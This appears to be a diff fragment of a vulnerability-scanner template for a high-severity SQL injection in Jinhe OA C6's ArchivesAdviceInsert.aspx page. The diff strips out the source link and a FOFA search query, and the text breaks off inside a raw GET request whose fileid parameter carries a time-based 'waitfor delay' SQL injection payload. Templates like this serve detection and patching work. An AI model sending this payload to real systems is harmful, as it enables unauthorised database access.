@@ -3,12 +3,8 @@ info:
   name: 金和OA_C6 ArchivesAdviceInsert存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nilac8f7cug8vsc4'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: nilac8f7cug8vsc4
-    fofa: app="金和网络-金和 OA"
 http:
 - raw:
   - 'GET /c6/Jhsoft.Web.Archives/ArchivesAdviceInsert.aspx/?fileid=1&filetype=1%27waitfor+delay+%270%3A0%3A5%27-- HTTP/1.1
